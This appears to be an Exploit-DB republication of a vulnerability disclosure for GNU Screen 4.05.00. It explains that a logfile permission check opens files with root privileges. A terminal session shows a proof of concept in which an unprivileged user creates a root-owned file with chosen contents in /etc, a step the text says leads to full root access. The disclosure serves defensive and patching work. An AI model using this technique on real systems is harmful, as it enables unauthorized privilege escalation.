@@ -1,0 +1,26 @@
+Commit f86a374 ("screen.c: adding permissions check for the logfile name",
+2015-11-04)
+
+The check opens the logfile with full root privileges. This allows us to
+truncate any file or create a root-owned file with any contents in any
+directory and can be easily exploited to full root access in several ways.
+
+> address@hidden:~$ screen --version
+> Screen version 4.05.00 (GNU) 10-Dec-16
+> address@hidden:~$ id
+> uid=125(buczek) gid=125(buczek)
+groups=125(buczek),15(users),19(adm),42(admin),154(Omp3grp),200(algrgrp),209(cdgrp),242(gridgrp),328(nchemgrp),407(hoeheweb),446(spwgrp),453(helpdesk),512(twikigrp),584(zmgrp),598(edv),643(megamgrp),677(greedgrp),5000(abt_srv),16003(framesgr),16012(chrigrp),17001(priv_cpw)
+> address@hidden:~$ cd /etc
+> address@hidden:/etc (master)$ screen -D -m -L bla.bla echo fail
+> address@hidden:/etc (master)$ ls -l bla.bla
+> -rw-rw---- 1 root buczek 6 Jan 24 19:58 bla.bla
+> address@hidden:/etc (master)$ cat bla.bla
+> fail
+> address@hidden:/etc (master)$ 
+
+Donald Buczek <address@hidden>
+
+
+
+
+EDB Note: Follow up ~ http://seclists.org/oss-sec/2017/q1/184
